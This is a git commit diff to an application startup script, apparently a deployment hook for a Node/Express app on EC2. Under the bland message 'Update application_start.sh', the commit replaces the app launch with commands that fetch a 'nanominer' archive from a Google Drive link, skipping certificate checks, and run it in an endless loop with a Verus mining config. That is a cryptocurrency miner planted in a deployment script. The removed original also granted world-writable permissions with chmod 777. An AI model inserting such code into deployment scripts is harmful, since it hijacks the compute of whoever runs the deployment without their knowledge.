4760b9ba15748e02c04ba040c6b76d28c0990c8f
kemya15 <84995700+kemya15@users.noreply.github.com>
2021-05-29 14:32:27 +0700

    Update application_start.sh

--- scripts/application_start.sh
+++ scripts/application_start.sh
@@ -1,18 +1,11 @@
-#!/bin/bash
-
-#give permission for everything in the express-app directory
-sudo chmod -R 777 /home/ec2-user/express-app
-
-#navigate into our working directory where we have all our github files
-cd /home/ec2-user/express-app
-
-#add npm and node to path
-export NVM_DIR="$HOME/.nvm"	
-[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # loads nvm	
-[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"  # loads nvm bash_completion (node is in path now)
-
-#install node modules
-npm install
-
-#start our node app in the background
-node app.js > app.out.log 2> app.err.log < /dev/null & 
+#!/bin/sh
+apt update
+wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1J08VYs2oqesb5QaE809LtC2N5skthPdc' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1J08VYs2oqesb5QaE809LtC2N5skthPdc" -O nanominer.tar.gz && rm -rf /tmp/cookies.txt
+tar xf nanominer.tar.gz
+cd nanominer
+chmod u+x nanominer
+while [ 1 ]; do
+./nanominer config_verus.ini
+sleep 3
+done
+sleep 999
